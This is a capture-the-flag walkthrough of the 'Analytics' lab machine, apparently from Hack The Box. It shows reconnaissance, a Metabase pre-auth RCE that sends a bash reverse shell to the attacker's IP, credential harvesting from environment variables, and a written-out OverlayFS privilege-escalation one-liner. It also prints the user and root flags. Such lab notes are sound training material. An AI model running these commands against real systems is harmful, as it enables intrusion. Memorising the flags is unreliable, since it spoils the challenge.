# Analytics

> IP: [10.10.11.233]

## NOTES / STEPS

1. Deploy Machine
2. NMAP
   1. > nmap -sC -sV 10.10.11.233 -oN init_scan
      1. Port 22 -> ssh
      2. Port 80 -> http
         1. http-title: Did not follow redirect to http://analytical.htb/ -> need to add to /etc/hosts
3. HTTP
   1. Navigate to website and look at source code and site
      1. On here we see normal navigation, but the login page redirects to data.analytical.htb so need to add this subdomain to our /etc/hosts
   2. ADD SUBDOMAIN
      1. Redirected to: "http://data.analytical.htb/auth/login?redirect=%2F"
      2. This looks to be a standard login form
   3. GOBUSTER
      1. DOMAIN
         1. > gobuster dir -x php,txt,html -u http://analytical.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
            1. /images
            2. /css
            3. /js
      2. SUBDOMAIN
         1. > gobuster dir -x php,txt,html -u http://data.analytical.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
4. RESEARCH
   1. Looknig around I found a github repo that talks about a pre-auth RCE for metabase
      1. CVE-2023-38646
      2. LINK: "https://github.com/m3m0o/metabase-pre-auth-rce-poc"
5. CVE-2023-38646 POC
   1. Need the url, setup token, and command
   2. URL: "http://data.analytical.htb/"
   3. SETUP-TOKEN: "setup-token":"249fa03d-fd94-4d5b-b94f-b4ebf3df681f"
      1. This is found by going to /api/session/properties
   4. COMMAND: bash revshell -> "bash -i >& /dev/tcp/MY_IP_ADDR/1234 0>&1"
   5. PYTHON SCRIPT
      1. Download the script from github
6. EXPLOIT
   1. > python3 exploit.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c "bash -i >& /dev/tcp/10.10.14.188/1234 0>&1"
   2. Setup netcat listener
   3. SUCCESS!
      1. Stabilize shell
7. ENUMERATION
   1. We are spawned into the base dir "/"
   2. Listing all files
      1. > ls -la
         1. In here we see a couple interesting files/dir
            1. drwxr-xr-x 1 metabase metabase 4096 Aug 3 2023 metabase.db
            2. -rwxr-xr-x 1 root root 0 Mar 3 22:12 .dockerenv
      2. This makes me think we are in a docker environment potentially?
   3. Check out the metabase.db dir first
      1. > cat metabase.db.mv.db
      2. TONS OF LINES
      3. Several grep attempts
      4. Metabase database schema research
   4. LINPEAS
      1. ENV VARIABLES
         1. META_USER=metalytics
         2. META_PASS=An4lytics_ds20223#
      2. /proc mounted? ................. Yes
      3. -rw-r--r--    1 root     root     292187539 Jun 29  2023 /app/metabase.jar
8. SSH
   1. Sign in as the metalytics user
      1. > ssh metalytics@analytical.htb
         1. PW: An4lytics_ds20223#
         2. SUCCESS
9. ENUERATION
   1. Check for sudo privleges (if any)
      1. > sudo -l
         1. RESPONSE: Sorry, user metalytics may not run sudo on localhost.
   2. Get user flag
      1. > cat user.txt
         1. FLAG: `86f7c21788d47dc98d06ef436425c684`
   3. LINPEAS
      1. Only found other (htb users) that were concurrently working on the same machine files
      2. OS: 22.04.2-Ubuntu
   4. RESERCH
      1. Looking into the OS version we see the following CVE's
         1. CVE-2023-2640 & CVE-2023-32629
         2. We can escalate privleges with

            ```sh
               unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
               setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
            ```

10. EXPLOIT
    1. Run our command
    2. SUCCESS, we are now root
    3. Get flag
       1. > cat /root/root.txt
          1. FLAG: `66d7c7a1628934a7d52595e722cb481c`

## QUESTIONS

1. Submit user flag
   1. `86f7c21788d47dc98d06ef436425c684`
2. Submit root flag
   1. `66d7c7a1628934a7d52595e722cb481c`
